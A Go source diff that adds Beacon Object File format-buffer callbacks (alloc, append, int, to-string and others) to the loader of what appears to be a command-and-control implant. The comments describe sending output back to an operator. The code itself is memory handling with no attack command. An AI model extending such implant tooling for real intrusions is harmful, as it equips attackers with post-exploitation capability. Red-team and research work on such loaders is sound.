@@ -78,13 +78,19 @@ func parseDollarImport(name string) (dll, fn string, ok bool) {
 
 func initBeaconCallbacks() {
 	beaconCBs = map[string]uintptr{
-		"__imp_BeaconPrintf":      syscall.NewCallback(beaconPrintfImpl),
-		"__imp_BeaconOutput":      syscall.NewCallback(beaconOutputImpl),
-		"__imp_BeaconDataParse":   syscall.NewCallback(beaconDataParseImpl),
-		"__imp_BeaconDataInt":     syscall.NewCallback(beaconDataIntImpl),
-		"__imp_BeaconDataShort":   syscall.NewCallback(beaconDataShortImpl),
-		"__imp_BeaconDataLength":  syscall.NewCallback(beaconDataLengthImpl),
-		"__imp_BeaconDataExtract": syscall.NewCallback(beaconDataExtractImpl),
+		"__imp_BeaconPrintf":       syscall.NewCallback(beaconPrintfImpl),
+		"__imp_BeaconOutput":       syscall.NewCallback(beaconOutputImpl),
+		"__imp_BeaconDataParse":    syscall.NewCallback(beaconDataParseImpl),
+		"__imp_BeaconDataInt":      syscall.NewCallback(beaconDataIntImpl),
+		"__imp_BeaconDataShort":    syscall.NewCallback(beaconDataShortImpl),
+		"__imp_BeaconDataLength":   syscall.NewCallback(beaconDataLengthImpl),
+		"__imp_BeaconDataExtract":  syscall.NewCallback(beaconDataExtractImpl),
+		"__imp_BeaconFormatAlloc":  syscall.NewCallback(beaconFormatAllocImpl),
+		"__imp_BeaconFormatReset":  syscall.NewCallback(beaconFormatResetImpl),
+		"__imp_BeaconFormatFree":   syscall.NewCallback(beaconFormatFreeImpl),
+		"__imp_BeaconFormatAppend": syscall.NewCallback(beaconFormatAppendImpl),
+		"__imp_BeaconFormatInt":    syscall.NewCallback(beaconFormatIntImpl),
+		"__imp_BeaconFormatToString": syscall.NewCallback(beaconFormatToStringImpl),
 	}
 }
 
@@ -224,6 +230,138 @@ func beaconDataExtractImpl(parserPtr, outLenPtr uintptr) uintptr {
 		*(*int32)(unsafe.Pointer(outLenPtr)) = chunkLen
 	}
 	return dataPtr
+}
+
+// formatp mirrors the CS BOF format-buffer struct. Same wire shape as
+// dataParser — the BOF allocates the struct on its stack and we
+// manage cursor + size in place. Underlying bytes live in a Go-side
+// map (formatBuffers) keyed by the formatp pointer; this keeps the
+// slice referenced so Go's GC won't reclaim it while the BOF holds
+// the pointer.
+type formatp struct {
+	original uintptr
+	buffer   uintptr
+	length   int32
+	_        [4]byte
+	size     int32
+}
+
+var (
+	formatBufMu  sync.Mutex
+	formatBuffers = map[uintptr][]byte{}
+)
+
+// beaconFormatAllocImpl handles BeaconFormatAlloc(format*, int maxsz).
+// Allocates a maxsz-byte slice in Go heap, stores it under the formatp
+// pointer, and seeds the BOF-visible cursor/size fields.
+func beaconFormatAllocImpl(formatPtr, maxsz uintptr) uintptr {
+	if formatPtr == 0 || maxsz == 0 {
+		return 0
+	}
+	buf := make([]byte, int(maxsz))
+	formatBufMu.Lock()
+	formatBuffers[formatPtr] = buf
+	formatBufMu.Unlock()
+	base := uintptr(unsafe.Pointer(&buf[0]))
+	p := (*formatp)(unsafe.Pointer(formatPtr))
+	p.original = base
+	p.buffer = base
+	p.length = 0
+	p.size = int32(maxsz)
+	return 0
+}
+
+// beaconFormatResetImpl rewinds the cursor to the start of the buffer.
+func beaconFormatResetImpl(formatPtr uintptr) uintptr {
+	if formatPtr == 0 {
+		return 0
+	}
+	p := (*formatp)(unsafe.Pointer(formatPtr))
+	p.buffer = p.original
+	p.length = 0
+	return 0
+}
+
+// beaconFormatFreeImpl drops the Go-side slice. After Free, subsequent
+// calls on the same formatp are no-ops (the slice is gone, length is
+// already zero).
+func beaconFormatFreeImpl(formatPtr uintptr) uintptr {
+	if formatPtr == 0 {
+		return 0
+	}
+	formatBufMu.Lock()
+	delete(formatBuffers, formatPtr)
+	formatBufMu.Unlock()
+	p := (*formatp)(unsafe.Pointer(formatPtr))
+	p.original = 0
+	p.buffer = 0
+	p.length = 0
+	p.size = 0
+	return 0
+}
+
+// beaconFormatAppendImpl writes len bytes from src into the format
+// buffer at the current cursor. Truncates silently when the buffer is
+// full — matches the CS contract of "best-effort append, callers
+// check size".
+func beaconFormatAppendImpl(formatPtr, srcPtr, length uintptr) uintptr {
+	if formatPtr == 0 || srcPtr == 0 || length == 0 {
+		return 0
+	}
+	p := (*formatp)(unsafe.Pointer(formatPtr))
+	remaining := p.size - p.length
+	if remaining <= 0 {
+		return 0
+	}
+	n := int32(length)
+	if n > remaining {
+		n = remaining
+	}
+	src := unsafe.Slice((*byte)(unsafe.Pointer(srcPtr)), int(n))
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), int(n))
+	copy(dst, src)
+	p.buffer += uintptr(n)
+	p.length += n
+	return 0
+}
+
+// beaconFormatIntImpl writes a 4-byte int in big-endian (network byte
+// order) per the CS convention. Cobalt Strike's BeaconFormatInt is the
+// counterpart of BeaconDataInt — when the BOF is producing a buffer
+// the operator pulls back, the int is read on the operator side via
+// the same convention. We follow their order.
+func beaconFormatIntImpl(formatPtr, val uintptr) uintptr {
+	if formatPtr == 0 {
+		return 0
+	}
+	p := (*formatp)(unsafe.Pointer(formatPtr))
+	if p.size-p.length < 4 {
+		return 0
+	}
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 4)
+	v := uint32(val)
+	dst[0] = byte(v >> 24)
+	dst[1] = byte(v >> 16)
+	dst[2] = byte(v >> 8)
+	dst[3] = byte(v)
+	p.buffer += 4
+	p.length += 4
+	return 0
+}
+
+// beaconFormatToStringImpl returns the original buffer pointer and
+// writes the current length into outSize. The BOF then reads
+// length bytes starting at the returned pointer. CS BOFs pair this
+// with BeaconOutput to ship the format buffer out of the implant.
+func beaconFormatToStringImpl(formatPtr, outSizePtr uintptr) uintptr {
+	if formatPtr == 0 {
+		return 0
+	}
+	p := (*formatp)(unsafe.Pointer(formatPtr))
+	if outSizePtr != 0 {
+		*(*int32)(unsafe.Pointer(outSizePtr)) = p.length
+	}
+	return p.original
 }
 
 // cStringFromPtr reads a NUL-terminated C string from ptr, capping at max
